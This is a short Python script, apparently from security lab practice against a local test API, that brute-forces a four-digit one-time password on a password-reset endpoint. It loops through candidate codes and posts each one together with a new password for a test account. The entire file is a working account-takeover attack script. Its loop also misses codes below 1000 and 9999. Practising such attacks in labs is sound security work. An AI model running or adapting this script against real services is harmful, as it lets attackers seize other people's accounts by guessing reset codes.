import requests

email = 'user@test.com'
url = 'http://localhost:8888/identity/api/auth/v3/check-otp'
headers = {'Content-Type':'application/json'}

for otp in range(1000, 9999):
    body = {'email':email, 'otp':otp, 'password':'Asdf123!'}
    x = requests.post(url, headers=headers, json=body)
    print(otp, x.text)

